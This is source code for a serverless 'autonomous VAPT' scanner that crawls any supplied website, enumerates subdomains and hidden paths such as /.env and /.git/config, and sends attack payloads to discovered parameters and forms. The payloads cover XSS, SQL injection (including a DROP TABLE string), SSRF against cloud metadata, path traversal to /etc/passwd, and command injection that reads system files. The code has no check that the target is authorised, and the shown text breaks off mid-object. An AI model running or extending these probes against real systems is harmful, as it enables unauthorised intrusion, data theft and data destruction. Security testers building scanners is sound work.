import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

/**
 * OmniSec™ Autonomous VAPT Engine (XBOW-like)
 * Self-learning AI-powered penetration testing with real endpoint discovery
 * Features:
 * - Auto endpoint discovery (subdomain enumeration, URL crawling, API discovery)
 * - Real vulnerability testing with adaptive payloads
 * - AI-powered learning and payload mutation
 * - Shodan integration for reconnaissance
 * - POC generation for exploits
 * - False positive reduction through feedback
 */

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface Finding {
  id: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  endpoint: string;
  method?: string;
  payload?: string;
  evidence?: string;
  response?: string;
  remediation: string;
  cwe?: string;
  cvss?: number;
  mitre?: string[];
  confidence: number;
  poc?: string;
  exploitCode?: string;
  falsePositive?: boolean;
  retryCount?: number;
}

interface LearningData {
  actionId: string;
  finding: Finding;
  outcome: 'success' | 'false_positive' | 'blocked' | 'retry';
  payloadUsed: string;
  responsePattern: string;
  timestamp: string;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    const SHODAN_API_KEY = Deno.env.get("SHODAN_API_KEY");
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const body = await req.json();
    const { 
      target, 
      action = 'full_scan',
      modules = ['all'],
      maxDepth = 3,
      enableLearning = true,
      retryWithAI = true,
      generatePOC = true,
      previousFindings = []
    } = body;

    if (!target) {
      return new Response(
        JSON.stringify({ error: "Target is required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Normalize target
    let targetUrl: URL;
    try {
      targetUrl = new URL(target.startsWith('http') ? target : `https://${target}`);
    } catch {
      return new Response(
        JSON.stringify({ error: "Invalid target URL" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    console.log(`[AUTONOMOUS VAPT] Starting on ${targetUrl.toString()}`);
    const startTime = Date.now();
    const allFindings: Finding[] = [];
    const discoveredEndpoints: string[] = [];
    const learningData: LearningData[] = [];
    const scanId = crypto.randomUUID();

    // Helper to save current results to DB (can be called at any point)
    const saveResultsToDB = async (status: string, extraFindings: Finding[] = allFindings) => {
      const findings = extraFindings.filter(f => !f.falsePositive);
      const severityCounts = {
        critical: findings.filter(f => f.severity === 'critical').length,
        high: findings.filter(f => f.severity === 'high').length,
        medium: findings.filter(f => f.severity === 'medium').length,
        low: findings.filter(f => f.severity === 'low').length,
        info: findings.filter(f => f.severity === 'info').length
      };
      try {
        await supabase.from('scan_history').insert({
          module: 'autonomous_vapt',
          scan_type: 'Autonomous VAPT - Full Red Team Assessment',
          target: targetUrl.toString(),
          status,
          findings_count: findings.length,
          duration_ms: Date.now() - startTime,
          report: { findings }
        });
        await supabase.from('security_reports').insert({
          module: 'autonomous_vapt',
          title: `Autonomous VAPT - ${targetUrl.hostname}`,
          summary: `Found ${findings.length} issues: ${severityCounts.critical} critical, ${severityCounts.high} high`,
          findings,
          severity_counts: severityCounts,
          recommendations: []
        });
      } catch (e) { console.error('DB save error:', e); }
      return { severityCounts, findings };
    };

    // Helper to emit real-time progress
    const emitProgress = async (phase: string, phaseNumber: number, progress: number, message: string, extra: any = {}) => {
      try {
        await supabase.from('scan_progress').insert({
          scan_id: scanId,
          phase,
          phase_number: phaseNumber,
          total_phases: 10,
          progress,
          message,
          findings_so_far: extra.findings || allFindings.length,
          endpoints_discovered: extra.endpoints || discoveredEndpoints.length,
          current_endpoint: extra.currentEndpoint || null
        });
      } catch (e) { console.log('Progress emit error:', e); }
    };

    // Set a timeout to save partial results if function is about to be killed (150s safety)
    const timeoutId = setTimeout(async () => {
      console.log('[TIMEOUT SAFETY] Saving partial results before shutdown...');
      await saveResultsToDB('completed');
      await emitProgress('complete', 10, 100, `Scan saved (partial). ${allFindings.length} findings found.`);
    }, 150000);

    try {
      // Phase 1: Comprehensive Endpoint Discovery
      console.log('[Phase 1] Endpoint Discovery...');
      await emitProgress('discovery', 1, 5, 'Discovering endpoints & subdomains...');
      const discoveryResults = await discoverEndpoints(targetUrl, SHODAN_API_KEY, maxDepth);
      discoveredEndpoints.push(...discoveryResults.endpoints);
      console.log(`[Phase 1] Discovered ${discoveredEndpoints.length} endpoints`);
      await emitProgress('discovery', 1, 15, `Discovered ${discoveredEndpoints.length} endpoints`, { endpoints: discoveredEndpoints.length });

      // Phase 2: Fingerprinting & Technology Detection
      console.log('[Phase 2] Fingerprinting...');
      await emitProgress('fingerprint', 2, 20, 'Fingerprinting target technologies...');
      const fingerprint = await fingerprintTarget(targetUrl, discoveryResults);
      await emitProgress('fingerprint', 2, 25, `Detected: ${fingerprint.technologies?.join(', ') || 'analyzing...'}`);

      // Phase 3: Vulnerability Assessment on ALL discovered endpoints
      console.log('[Phase 3] Vulnerability Assessment...');
      await emitProgress('vuln_assessment', 3, 30, 'Starting vulnerability assessment on all endpoints...');
      const previousPayloads = await getFailedPayloads(supabase, targetUrl.hostname);
      
      const endpointsToTest = discoveredEndpoints.slice(0, 50); // Reduced for speed
      for (let i = 0; i < endpointsToTest.length; i++) {
        const endpoint = endpointsToTest[i];
        if (i % 5 === 0) {
          await emitProgress('vuln_assessment', 3, 30 + Math.round((i / endpointsToTest.length) * 15), 
            `Testing endpoint ${i + 1}/${endpointsToTest.length}`, { currentEndpoint: endpoint });
        }
        const endpointFindings = await assessEndpoint(
          endpoint, 
          fingerprint, 
          LOVABLE_API_KEY, 
          previousPayloads,
          retryWithAI
        );
        allFindings.push(...endpointFindings);
      }

      // Phase 4: Deep Injection Testing
      console.log('[Phase 4] Deep Injection Testing...');
      await emitProgress('injection', 4, 50, `Running deep injection tests on ${discoveryResults.forms?.length || 0} forms...`);
      const injectionFindings = await performDeepInjectionTest(
        targetUrl,
        discoveryResults.forms,
        discoveryResults.params,
        LOVABLE_API_KEY,
        previousPayloads,
        retryWithAI
      );
      allFindings.push(...injectionFindings);
      await emitProgress('injection', 4, 58, `Injection testing complete. ${allFindings.length} findings so far.`);

      // Phase 5: Authentication & Authorization Testing
      console.log('[Phase 5] Auth Testing...');
      await emitProgress('auth', 5, 60, 'Testing authentication & authorization mechanisms...');
      const authFindings = await testAuthentication(targetUrl, discoveryResults.authEndpoints);
      allFindings.push(...authFindings);

      // Phase 6: Business Logic Testing
      console.log('[Phase 6] Business Logic Testing...');
      await emitProgress('business_logic', 6, 68, 'Analyzing business logic for vulnerabilities...');
      const businessFindings = await testBusinessLogic(targetUrl, discoveryResults.workflows);
      allFindings.push(...businessFindings);

      // Phase 7: AI Correlation & Attack Path Analysis
      console.log('[Phase 7] AI Correlation...');
      await emitProgress('correlation', 7, 75, `AI correlating ${allFindings.length} findings for attack paths...`);
      const correlationResult = await performAICorrelation(
        allFindings,
        discoveryResults,
        fingerprint,
        LOVABLE_API_KEY
      );

      // Phase 8: Generate POC for exploitable findings
      console.log('[Phase 8] POC Generation...');
      const critHighFindings = allFindings.filter(f => f.severity === 'critical' || f.severity === 'high');
      await emitProgress('poc', 8, 82, `Generating POC exploits for ${critHighFindings.length} critical/high findings...`);
      const findingsWithPOC = generatePOC ? 
        await generateExploitPOC(critHighFindings, LOVABLE_API_KEY) :
        allFindings;

      // Phase 9: False Positive Reduction via AI
      console.log('[Phase 9] False Positive Analysis...');
      await emitProgress('fp_reduction', 9, 90, 'AI analyzing for false positive reduction...');
      const verifiedFindings = enableLearning ?
        await reduceFalsePositives(findingsWithPOC, previousFindings, LOVABLE_API_KEY) :
        findingsWithPOC;

      // Phase 10: Save learning data
      await emitProgress('learning', 10, 95, 'Saving learning data for future improvement...');
      if (enableLearning) {
        await saveLearningData(supabase, targetUrl.hostname, verifiedFindings, learningData);
      }

      // Clear timeout safety - we completed normally
      clearTimeout(timeoutId);

      // Save final results
      const { severityCounts, findings } = await saveResultsToDB('completed', verifiedFindings);
      await emitProgress('complete', 10, 100, `Scan complete! ${findings.length} verified findings.`);

      console.log(`[COMPLETE] Scan finished in ${Date.now() - startTime}ms`);

      return new Response(
        JSON.stringify({
          success: true,
          target: targetUrl.toString(),
          scanTime: Date.now() - startTime,
          discovery: {
            endpoints: discoveredEndpoints.length,
            subdomains: discoveryResults.subdomains?.length || 0,
            forms: discoveryResults.forms?.length || 0,
            apis: discoveryResults.apiEndpoints?.length || 0
          },
          fingerprint,
          findings: verifiedFindings,
          attackPaths: correlationResult.attackPaths,
          chainedExploits: correlationResult.chainedExploits,
          summary: severityCounts,
          recommendations: correlationResult.recommendations,
          learningApplied: enableLearning,
          aiRetries: verifiedFindings.filter(f => f.retryCount && f.retryCount > 0).length
        }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    } catch (innerError: any) {
      clearTimeout(timeoutId);
      console.error("[SCAN PHASE ERROR]", innerError);
      // Save whatever we have so far
      await saveResultsToDB('completed');
      await emitProgress('complete', 10, 100, `Scan finished with ${allFindings.length} findings (some phases may have failed).`);
      
      return new Response(
        JSON.stringify({
          success: true,
          target: targetUrl.toString(),
          scanTime: Date.now() - startTime,
          discovery: { endpoints: discoveredEndpoints.length, subdomains: 0, forms: 0, apis: 0 },
          fingerprint: {},
          findings: allFindings,
          attackPaths: [],
          chainedExploits: [],
          summary: {
            critical: allFindings.filter(f => f.severity === 'critical').length,
            high: allFindings.filter(f => f.severity === 'high').length,
            medium: allFindings.filter(f => f.severity === 'medium').length,
            low: allFindings.filter(f => f.severity === 'low').length,
            info: allFindings.filter(f => f.severity === 'info').length,
          },
          recommendations: [],
          learningApplied: enableLearning,
          aiRetries: 0
        }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

  } catch (error: any) {
    console.error("[AUTONOMOUS VAPT ERROR]", error);
    return new Response(
      JSON.stringify({ error: error.message || "Scan failed", success: false }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});

// Comprehensive endpoint discovery
async function discoverEndpoints(target: URL, shodanKey: string | undefined, maxDepth: number): Promise<any> {
  const results: any = {
    endpoints: [target.toString()],
    subdomains: [],
    forms: [],
    params: [],
    apiEndpoints: [],
    authEndpoints: [],
    workflows: [],
    technologies: [],
    headers: {},
    serverInfo: null
  };

  try {
    // 1. Main page crawl
    const mainPage = await fetchWithTimeout(target.toString(), 30000);
    if (mainPage.ok) {
      const html = await mainPage.text();
      results.headers = Object.fromEntries(mainPage.headers.entries());
      results.serverInfo = mainPage.headers.get('server');
      
      // Extract all links
      const linkMatches = html.match(/(?:href|src|action)=["']([^"']+)["']/gi) || [];
      const baseHost = target.hostname;
      
      for (const match of linkMatches) {
        const url = match.replace(/^(?:href|src|action)=["']/i, '').replace(/["']$/, '');
        if (!url.startsWith('#') && !url.startsWith('javascript:') && !url.startsWith('mailto:')) {
          try {
            const fullUrl = new URL(url, target).toString();
            if (fullUrl.includes(baseHost) || !url.startsWith('http')) {
              results.endpoints.push(fullUrl);
            }
          } catch {}
        }
      }

      // Extract forms with all inputs
      const formMatches = html.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
      results.forms = formMatches.slice(0, 20).map((form, i) => {
        const action = form.match(/action=["']([^"']+)["']/i)?.[1] || '';
        const method = form.match(/method=["']([^"']+)["']/i)?.[1] || 'GET';
        const inputs = (form.match(/<input[^>]+>/gi) || []).map(inp => {
          const name = inp.match(/name=["']([^"']+)["']/i)?.[1];
          const type = inp.match(/type=["']([^"']+)["']/i)?.[1] || 'text';
          const id = inp.match(/id=["']([^"']+)["']/i)?.[1];
          return { name, type, id };
        }).filter(i => i.name);
        const textareas = (form.match(/<textarea[^>]+>/gi) || []).map(ta => {
          const name = ta.match(/name=["']([^"']+)["']/i)?.[1];
          return { name, type: 'textarea' };
        }).filter(t => t.name);
        return { id: i, action, method: method.toUpperCase(), inputs: [...inputs, ...textareas] };
      });

      // Extract URL parameters
      const paramMatches = html.match(/\?[^"'\s>]+/g) || [];
      for (const param of paramMatches) {
        const pairs = param.slice(1).split('&');
        for (const pair of pairs) {
          const [key] = pair.split('=');
          if (key && !results.params.includes(key)) {
            results.params.push(key);
          }
        }
      }

      // Detect technologies
      if (html.includes('wp-content') || html.includes('WordPress')) results.technologies.push('WordPress');
      if (html.includes('Joomla')) results.technologies.push('Joomla');
      if (html.includes('Drupal')) results.technologies.push('Drupal');
      if (html.includes('React') || html.includes('react')) results.technologies.push('React');
      if (html.includes('Angular') || html.includes('ng-')) results.technologies.push('Angular');
      if (html.includes('Vue') || html.includes('v-')) results.technologies.push('Vue.js');
      if (html.includes('jQuery')) results.technologies.push('jQuery');
      if (html.includes('.php')) results.technologies.push('PHP');
      if (html.includes('.aspx')) results.technologies.push('ASP.NET');
      if (html.includes('Laravel')) results.technologies.push('Laravel');
      if (html.includes('Django')) results.technologies.push('Django');
      if (html.includes('Express')) results.technologies.push('Express.js');
    }

    // 2. Common paths discovery
    const commonPaths = [
      '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/rest',
      '/admin', '/login', '/signin', '/auth', '/oauth', '/register', '/signup',
      '/dashboard', '/panel', '/console', '/manager', '/users', '/account',
      '/swagger', '/swagger-ui', '/api-docs', '/openapi.json', '/docs',
      '/robots.txt', '/sitemap.xml', '/.well-known/security.txt',
      '/wp-admin', '/wp-login.php', '/wp-json', '/xmlrpc.php',
      '/phpmyadmin', '/phpinfo.php', '/server-status', '/server-info',
      '/.git/config', '/.env', '/config.json', '/settings.json',
      '/health', '/healthz', '/ready', '/live', '/metrics', '/debug',
      '/backup', '/test', '/dev', '/staging', '/old', '/temp',
      '/upload', '/uploads', '/files', '/media', '/assets', '/static'
    ];

    // Batch parallel path discovery (10 at a time)
    for (let i = 0; i < commonPaths.length; i += 10) {
      const batch = commonPaths.slice(i, i + 10);
      const promises = batch.map(async (path) => {
        try {
          const testUrl = new URL(path, target).toString();
          const response = await fetchWithTimeout(testUrl, 4000);
          if (response.status === 200 || response.status === 301 || response.status === 302) {
            results.endpoints.push(testUrl);
            if (path.includes('api') || path.includes('graphql') || path.includes('rest')) {
              results.apiEndpoints.push(testUrl);
            }
            if (path.includes('login') || path.includes('auth') || path.includes('signin')) {
              results.authEndpoints.push(testUrl);
            }
          }
        } catch {}
      });
      await Promise.all(promises);
    }

    // 3. Shodan integration for host discovery
    if (shodanKey) {
      try {
        const shodanUrl = `https://api.shodan.io/dns/resolve?hostnames=${target.hostname}&key=${shodanKey}`;
        const shodanResp = await fetchWithTimeout(shodanUrl, 10000);
        if (shodanResp.ok) {
          const shodanData = await shodanResp.json();
          const ip = shodanData[target.hostname];
          if (ip) {
            // Get host info
            const hostUrl = `https://api.shodan.io/shodan/host/${ip}?key=${shodanKey}`;
            const hostResp = await fetchWithTimeout(hostUrl, 10000);
            if (hostResp.ok) {
              const hostData = await hostResp.json();
              results.shodanData = {
                ip,
                ports: hostData.ports || [],
                vulns: hostData.vulns || [],
                hostnames: hostData.hostnames || [],
                org: hostData.org,
                isp: hostData.isp,
                os: hostData.os
              };
              // Add port-based endpoints
              for (const port of (hostData.ports || [])) {
                if ([80, 443, 8080, 8443, 3000, 5000, 8000].includes(port)) {
                  const proto = port === 443 || port === 8443 ? 'https' : 'http';
                  results.endpoints.push(`${proto}://${target.hostname}:${port}/`);
                }
              }
            }
          }
        }
      } catch (e) {
        console.log('Shodan lookup failed:', e);
      }
    }

    // 4. Subdomain enumeration via crt.sh
    try {
      const crtUrl = `https://crt.sh/?q=%.${target.hostname}&output=json`;
      const crtResp = await fetchWithTimeout(crtUrl, 15000);
      if (crtResp.ok) {
        const crtData = await crtResp.json();
        const subdomains = new Set<string>();
        for (const entry of (crtData || []).slice(0, 100)) {
          const names = entry.name_value?.split('\n') || [];
          for (const name of names) {
            if (name.includes(target.hostname) && !name.startsWith('*')) {
              subdomains.add(name.trim());
            }
          }
        }
        results.subdomains = Array.from(subdomains).slice(0, 50);
        // Add subdomains as endpoints
        for (const sub of results.subdomains.slice(0, 10)) {
          results.endpoints.push(`https://${sub}/`);
        }
      }
    } catch {}

    // Deduplicate endpoints
    results.endpoints = [...new Set(results.endpoints)];

  } catch (e: any) {
    console.error('Discovery error:', e.message);
    results.error = e.message;
  }

  return results;
}

// Target fingerprinting
async function fingerprintTarget(target: URL, discovery: any): Promise<any> {
  return {
    hostname: target.hostname,
    protocol: target.protocol,
    technologies: discovery.technologies || [],
    server: discovery.serverInfo,
    headers: discovery.headers,
    hasAuth: (discovery.authEndpoints?.length || 0) > 0,
    hasAPI: (discovery.apiEndpoints?.length || 0) > 0,
    formCount: discovery.forms?.length || 0,
    paramCount: discovery.params?.length || 0,
    shodanVulns: discovery.shodanData?.vulns || [],
    riskProfile: calculateRiskProfile(discovery)
  };
}

function calculateRiskProfile(discovery: any): string {
  let score = 0;
  if (discovery.shodanData?.vulns?.length > 0) score += 30;
  if (discovery.forms?.length > 5) score += 10;
  if (discovery.apiEndpoints?.length > 3) score += 15;
  if (discovery.endpoints?.some((e: string) => e.includes('.git') || e.includes('.env'))) score += 40;
  if (score >= 50) return 'critical';
  if (score >= 30) return 'high';
  if (score >= 15) return 'medium';
  return 'low';
}

// Get previously failed payloads for learning
async function getFailedPayloads(supabase: any, hostname: string): Promise<string[]> {
  try {
    const { data } = await supabase
      .from('vapt_test_actions')
      .select('payload_sent')
      .eq('domain', hostname)
      .eq('outcome_label', 'blocked')
      .limit(50);
    return data?.map((d: any) => d.payload_sent).filter(Boolean) || [];
  } catch {
    return [];
  }
}

// Assess individual endpoint - now with parameter-based XSS/SQLi probing
async function assessEndpoint(
  endpoint: string,
  fingerprint: any,
  apiKey: string | undefined,
  failedPayloads: string[],
  retryWithAI: boolean
): Promise<Finding[]> {
  const findings: Finding[] = [];

  try {
    const response = await fetchWithTimeout(endpoint, 15000);
    const status = response.status;
    const responseText = await response.text();
    const contentType = response.headers.get('content-type') || '';
    
    // Check for sensitive file exposure
    if (endpoint.includes('.git') || endpoint.includes('.env') || endpoint.includes('config')) {
      if (status === 200) {
        findings.push({
          id: `EXPOSURE-${Date.now()}`,
          severity: 'critical',
          title: `Sensitive File Exposed: ${endpoint.split('/').pop()}`,
          description: 'Critical configuration or version control file accessible',
          endpoint,
          method: 'GET',
          evidence: `HTTP ${status}, Content: ${responseText.slice(0, 200)}`,
          remediation: 'Block access to sensitive files via web server configuration',
          cwe: 'CWE-200',
          cvss: 9.0,
          mitre: ['T1552'],
          confidence: 95,
          poc: `curl -X GET "${endpoint}"`
        });
      }
    }

    // Check for API documentation exposure
    if (endpoint.includes('swagger') || endpoint.includes('api-docs') || endpoint.includes('openapi')) {
      if (status === 200) {
        findings.push({
          id: `API-DOCS-${Date.now()}`,
          severity: 'medium',
          title: 'API Documentation Exposed',
          description: 'API documentation accessible which may reveal internal endpoints',
          endpoint,
          method: 'GET',
          evidence: `HTTP ${status}`,
          remediation: 'Restrict API documentation to authorized users only',
          cwe: 'CWE-200',
          confidence: 90,
          poc: `curl -X GET "${endpoint}"`
        });
      }
    }

    // Check for debug/admin panels
    if (endpoint.includes('admin') || endpoint.includes('debug') || endpoint.includes('console')) {
      if (status === 200) {
        findings.push({
          id: `ADMIN-${Date.now()}`,
          severity: 'high',
          title: `Admin/Debug Panel Accessible: ${endpoint.split('/').pop()}`,
          description: 'Administrative or debug interface accessible',
          endpoint,
          method: 'GET',
          evidence: `HTTP ${status}`,
          remediation: 'Implement authentication for admin panels',
          cwe: 'CWE-306',
          cvss: 7.5,
          confidence: 85,
          poc: `curl -X GET "${endpoint}"`
        });
      }
    }

    // Check security headers (only on the main endpoint, skip duplicates)
    if (endpoint === fingerprint?.hostname || !endpoint.includes('?')) {
      const securityHeaders = ['x-frame-options', 'content-security-policy', 'strict-transport-security', 'x-content-type-options'];
      for (const header of securityHeaders) {
        if (!response.headers.get(header)) {
          findings.push({
            id: `HDR-${header.toUpperCase().replace(/-/g, '')}-${Date.now()}-${Math.random().toString(36).slice(2,6)}`,
            severity: 'low',
            title: `Missing ${header.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join('-')} Header`,
            description: `Security header ${header} not present`,
            endpoint,
            evidence: 'Header missing from response',
            remediation: `Add ${header} header to all responses`,
            cwe: 'CWE-16',
            confidence: 100
          });
        }
      }
    }

    // Server/technology disclosure
    const serverHeader = response.headers.get('server');
    const xPoweredBy = response.headers.get('x-powered-by');
    if (serverHeader && !findings.some(f => f.id.startsWith('SVR-'))) {
      findings.push({
        id: `SVR-DISC-${Date.now()}`,
        severity: 'low',
        title: `Server Version Disclosure: ${serverHeader}`,
        description: `Server header reveals technology: "${serverHeader}"`,
        endpoint,
        evidence: `Server: ${serverHeader}`,
        remediation: 'Remove or obfuscate the Server header',
        cwe: 'CWE-200',
        confidence: 100
      });
    }
    if (xPoweredBy) {
      findings.push({
        id: `TECH-DISC-${Date.now()}`,
        severity: 'low',
        title: `Technology Stack Disclosure: ${xPoweredBy}`,
        description: `X-Powered-By header reveals: "${xPoweredBy}"`,
        endpoint,
        evidence: `X-Powered-By: ${xPoweredBy}`,
        remediation: 'Remove the X-Powered-By header',
        cwe: 'CWE-200',
        confidence: 100
      });
    }

    // === Parameter-based vulnerability probing ===
    // Extract query params from the endpoint URL itself
    try {
      const parsedUrl = new URL(endpoint);
      const params = Array.from(parsedUrl.searchParams.keys());
      
      if (params.length > 0) {
        // XSS probe on each parameter
        const xssProbe = '"><img src=x onerror=alert(1)>';
        for (const param of params.slice(0, 5)) {
          try {
            const testUrl = new URL(endpoint);
            testUrl.searchParams.set(param, xssProbe);
            const xssResp = await fetchWithTimeout(testUrl.toString(), 10000);
            const xssBody = await xssResp.text();
            if (xssBody.includes(xssProbe) || xssBody.includes('onerror=alert')) {
              findings.push({
                id: `XSS-REFLECT-${Date.now()}-${param}`,
                severity: 'high',
                title: `Reflected XSS in parameter "${param}"`,
                description: `Parameter "${param}" reflects user input without sanitization, enabling script execution`,
                endpoint: testUrl.toString(),
                method: 'GET',
                payload: xssProbe,
                evidence: 'Payload reflected in response body',
                response: xssBody.slice(0, 500),
                remediation: 'Implement output encoding and Content-Security-Policy',
                cwe: 'CWE-79',
                cvss: 6.1,
                mitre: ['T1059.007'],
                confidence: 90,
                poc: `curl "${testUrl.toString()}"`
              });
            }
          } catch {}
        }

        // SQLi probe on each parameter
        const sqliProbe = "' OR '1'='1' --";
        for (const param of params.slice(0, 5)) {
          try {
            const testUrl = new URL(endpoint);
            testUrl.searchParams.set(param, sqliProbe);
            const sqliResp = await fetchWithTimeout(testUrl.toString(), 10000);
            const sqliBody = await sqliResp.text();
            const sqlErrors = ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle', 'sql error', 'odbc', 'jdbc', 'syntax error', 'unclosed quotation', 'warning:'];
            const hasError = sqlErrors.some(err => sqliBody.toLowerCase().includes(err));
            
            // Also check for different response length (boolean-based SQLi)
            const normalUrl = new URL(endpoint);
            const normalResp = await fetchWithTimeout(normalUrl.toString(), 10000);
            const normalBody = await normalResp.text();
            const lengthDiff = Math.abs(sqliBody.length - normalBody.length);
            
            if (hasError) {
              findings.push({
                id: `SQLI-PARAM-${Date.now()}-${param}`,
                severity: 'critical',
                title: `SQL Injection in parameter "${param}"`,
                description: `Database error exposed when injecting SQL into parameter "${param}"`,
                endpoint: testUrl.toString(),
                method: 'GET',
                payload: sqliProbe,
                evidence: 'SQL error in response',
                response: sqliBody.slice(0, 500),
                remediation: 'Use parameterized queries / prepared statements',
                cwe: 'CWE-89',
                cvss: 9.8,
                mitre: ['T1190'],
                confidence: 92,
                poc: `curl "${testUrl.toString()}"`,
                exploitCode: `# SQLi exploit\nimport requests\nurl = "${testUrl.toString()}"\nresp = requests.get(url)\nprint(resp.text[:500])`
              });
            } else if (lengthDiff > 200) {
              findings.push({
                id: `SQLI-BOOL-${Date.now()}-${param}`,
                severity: 'high',
                title: `Potential Boolean-based SQL Injection in "${param}"`,
                description: `Parameter "${param}" shows significantly different response with SQL payload (${lengthDiff} bytes difference)`,
                endpoint: testUrl.toString(),
                method: 'GET',
                payload: sqliProbe,
                evidence: `Response length difference: ${lengthDiff} bytes`,
                remediation: 'Use parameterized queries',
                cwe: 'CWE-89',
                cvss: 8.6,
                mitre: ['T1190'],
                confidence: 70,
                poc: `curl "${testUrl.toString()}"`
              });
            }
          } catch {}
        }
      }
    } catch {}

    // === Detect common vuln patterns in page content ===
    // Check for directory listing
    if (responseText.includes('Index of /') || responseText.includes('Directory listing') || 
        responseText.includes('<title>Index of')) {
      findings.push({
        id: `DIRLIST-${Date.now()}`,
        severity: 'medium',
        title: 'Directory Listing Enabled',
        description: 'Web server exposes directory contents, potentially revealing sensitive files',
        endpoint,
        method: 'GET',
        evidence: 'Directory listing HTML detected',
        remediation: 'Disable directory listing in web server configuration',
        cwe: 'CWE-548',
        confidence: 95,
        poc: `curl "${endpoint}"`
      });
    }

    // Check for error messages leaking info
    if (responseText.match(/(?:fatal error|stack trace|exception|traceback|debug)/i) && status >= 400) {
      findings.push({
        id: `INFO-LEAK-${Date.now()}`,
        severity: 'medium',
        title: 'Verbose Error Messages / Stack Traces',
        description: 'Application exposes detailed error information that could aid attackers',
        endpoint,
        method: 'GET',
        evidence: 'Error/stack trace patterns detected in response',
        response: responseText.slice(0, 300),
        remediation: 'Implement custom error pages, disable debug mode in production',
        cwe: 'CWE-209',
        confidence: 85,
        poc: `curl "${endpoint}"`
      });
    }

  } catch {}

  return findings;
}

// Deep injection testing
async function performDeepInjectionTest(
  target: URL,
  forms: any[],
  params: string[],
  apiKey: string | undefined,
  failedPayloads: string[],
  retryWithAI: boolean
): Promise<Finding[]> {
  const findings: Finding[] = [];

  // AI-generated payloads if retrying
  let payloads = {
    xss: [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "'-alert(1)-'",
      '<svg/onload=alert(1)>',
      '{{constructor.constructor("alert(1)")()}}',
      '<img src=x onerror=prompt(1)>',
      '"><svg/onload=confirm(1)>'
    ],
    sqli: [
      "' OR '1'='1",
      "1' AND '1'='1",
      "'; DROP TABLE--",
      "1 UNION SELECT NULL--",
      "' OR 1=1--",
      "1' ORDER BY 1--",
      "' AND SLEEP(5)--"
    ],
    ssrf: [
      'http://169.254.169.254/latest/meta-data/',
      'http://localhost:22/',
      'file:///etc/passwd',
      'http://[::1]/',
      'http://127.0.0.1:6379/'
    ],
    lfi: [
      '../../../etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      'file:///etc/passwd',
      '/etc/passwd%00'
    ],
    rce: [
      '; id',
      '| id',
      '`id`',
      '$(id)',
      '; cat /etc/passwd',
      '| cat /etc/passwd'
    ]
  };

  // Generate AI-enhanced payloads if failed before
  if (retryWithAI && apiKey && failedPayloads.length > 0) {
    const aiPayloads = await generateAIPayloads(apiKey, failedPayloads, target.toString());
    if (aiPayloads) {
      payloads = { ...payloads, ...aiPayloads };
    }
  }

  // Test forms
  for (const form of forms.slice(0, 10)) {
    const formUrl = form.action ? new URL(form.action, target).toString() : target.toString();

    for (const input of form.inputs) {
      // XSS Testing
      for (const payload of payloads.xss.slice(0, 3)) {
        if (failedPayloads.includes(payload)) continue;
        
        try {
          const formData = new URLSearchParams();
          formData.set(input.name, payload);
          
          const response = await fetchWithTimeout(formUrl, 10000, {
            method: form.method === 'POST' ? 'POST' : 'GET',
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: form.method === 'POST' ? formData.toString() : undefined
          });
          
          const responseText = await response.text();
          
          if (responseText.includes(payload) || responseText.includes(payload.replace(/</g, '&lt;'))) {
            findings.push({
              id: `XSS-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
              severity: responseText.includes(payload) ? 'high' : 'medium',
              title: 'Cross-Site Scripting (XSS) Vulnerability',
              description: `Input field "${input.name}" reflects user input without sanitization`,
              endpoint: formUrl,
              method: form.method,
              payload,
              evidence: `Input: ${input.name}, Payload reflected`,
              response: responseText.slice(0, 500),
              remediation: 'Implement output encoding and CSP',
              cwe: 'CWE-79',
              cvss: 6.1,
              mitre: ['T1059.007'],
              confidence: 85,
              poc: `curl -X ${form.method} "${formUrl}" -d "${input.name}=${encodeURIComponent(payload)}"`
            });
            break;
          }
        } catch {}
      }

      // SQL Injection Testing
      for (const payload of payloads.sqli.slice(0, 3)) {
        if (failedPayloads.includes(payload)) continue;
        
        try {
          const formData = new URLSearchParams();
          formData.set(input.name, payload);
          
          const response = await fetchWithTimeout(formUrl, 10000, {
            method: form.method === 'POST' ? 'POST' : 'GET',
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: form.method === 'POST' ? formData.toString() : undefined
          });
          
          const responseText = await response.text();
          const sqlErrors = ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle', 'sql error', 'odbc', 'jdbc', 'syntax error', 'unclosed quotation'];
          const hasError = sqlErrors.some(err => responseText.toLowerCase().includes(err));
          
          if (hasError) {
            findings.push({
              id: `SQLI-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
              severity: 'critical',
              title: 'SQL Injection Vulnerability',
              description: `Database error exposed when injecting SQL into "${input.name}"`,
              endpoint: formUrl,
              method: form.method,
              payload,
              evidence: 'SQL error message in response',
              response: responseText.slice(0, 500),
              remediation: 'Use parameterized queries',
              cwe: 'CWE-89',
              cvss: 9.8,
              mitre: ['T1190', 'T1505'],
              confidence: 92,
